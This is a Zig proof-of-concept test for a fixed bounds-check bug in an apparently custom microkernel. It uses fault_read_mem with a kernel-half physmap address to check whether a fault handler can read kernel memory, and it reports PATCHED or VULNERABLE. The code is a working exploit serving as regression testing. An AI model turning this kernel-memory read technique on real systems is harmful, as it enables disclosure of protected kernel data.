// PoC for c576f52: sysFaultReadMem/sysFaultWriteMem missing vaddr bounds check.
//
// Pre-patch: fault_read_mem only validated buf_ptr (caller's buffer) against
// the user partition. The target vaddr was passed straight into resolveVaddr,
// which walks the target's page tables — and since copyKernelMappings installs
// the kernel half into every process page table, a fault handler could read
// arbitrary kernel memory through the physmap by passing a kernel-half VA.
//
// Post-patch: vaddr and vaddr+len are checked against
// AddrSpacePartition.user.contains() in both fault_read_mem and fault_write_mem;
// kernel-half VAs (and overflowing ranges) return E_BADADDR.
//
// Differential: parent spawns a child, acquires a fault_handler cap on it via
// IPC cap_transfer (same dance as s4_1_61), waits for the child to fault, then
// calls fault_read_mem with vaddr in the kernel half. Pre-patch: E_OK and the
// kernel mapping is mirrored into the parent's buffer. Post-patch: E_BADADDR.

const lib = @import("lib");
const perm_view = lib.perm_view;
const perms = lib.perms;
const syscall = lib.syscall;

const child_elf align(8) = @embedFile("zig-out/bin/child").*;

// Physmap base on x86-64. AddrSpacePartition.user ends at 0xFFFF_8000_0000_0000,
// so this address is unambiguously outside the user partition. It is also
// guaranteed to be backed by a real kernel mapping (the physmap is installed
// in every process page table via copyKernelMappings), so on a vulnerable
// kernel resolveVaddr() succeeds and the kernel happily mirrors physical 0
// into our buffer.
const KERNEL_VADDR: u64 = 0xFFFF_FF80_0000_0000;

fn findFaultHandlerProcHandle(view: [*]const perm_view.UserViewEntry) u64 {
    const fh_bit: u16 = @truncate((perms.ProcessHandleRights{ .fault_handler = true }).bits());
    for (0..128) |i| {
        if (view[i].entry_type == perm_view.ENTRY_TYPE_PROCESS and
            view[i].handle != 0 and
            (view[i].rights & fh_bit) != 0)
        {
            return view[i].handle;
        }
    }
    return 0;
}

pub fn main(pv: u64) void {
    const view: [*]const perm_view.UserViewEntry = @ptrFromInt(pv);

    // Spawn child with fault_handler ProcessRight so it may transfer a
    // fault_handler cap on itself back to us via ipc_reply_cap.
    const child_rights = perms.ProcessRights{ .fault_handler = true };
    const cr = syscall.proc_create(
        @intFromPtr(&child_elf),
        child_elf.len,
        child_rights.bits(),
    );
    if (cr <= 0) {
        syscall.write("POC-c576f52: proc_create failed\n");
        syscall.shutdown();
    }

    // IPC handshake to receive the fault_handler cap on the child.
    var reply: syscall.IpcMessage = .{};
    _ = syscall.ipc_call(@bitCast(cr), &.{}, &reply);

    // Wait for the child's null deref to land in our fault box.
    var fault_msg: syscall.FaultMessage = undefined;
    const recv_ret = syscall.fault_recv(@intFromPtr(&fault_msg), 1);
    if (recv_ret < 0) {
        syscall.write("POC-c576f52: fault_recv failed\n");
        syscall.shutdown();
    }

    const proc_handle = findFaultHandlerProcHandle(view);
    if (proc_handle == 0) {
        syscall.write("POC-c576f52: no fault_handler proc handle\n");
        syscall.shutdown();
    }

    // Attempt to read 8 bytes of *kernel* memory through the target's
    // page tables via fault_read_mem.
    var buf: [8]u8 = .{0} ** 8;
    const rc = syscall.fault_read_mem(proc_handle, KERNEL_VADDR, @intFromPtr(&buf), 8);

    if (rc == syscall.E_BADADDR) {
        syscall.write("POC-c576f52: PATCHED (kernel vaddr rejected, E_BADADDR)\n");
    } else if (rc == 0) {
        syscall.write("POC-c576f52: VULNERABLE (kernel read returned E_OK)\n");
    } else {
        syscall.write("POC-c576f52: VULNERABLE (kernel vaddr not bounds-checked)\n");
    }
    syscall.shutdown();
}
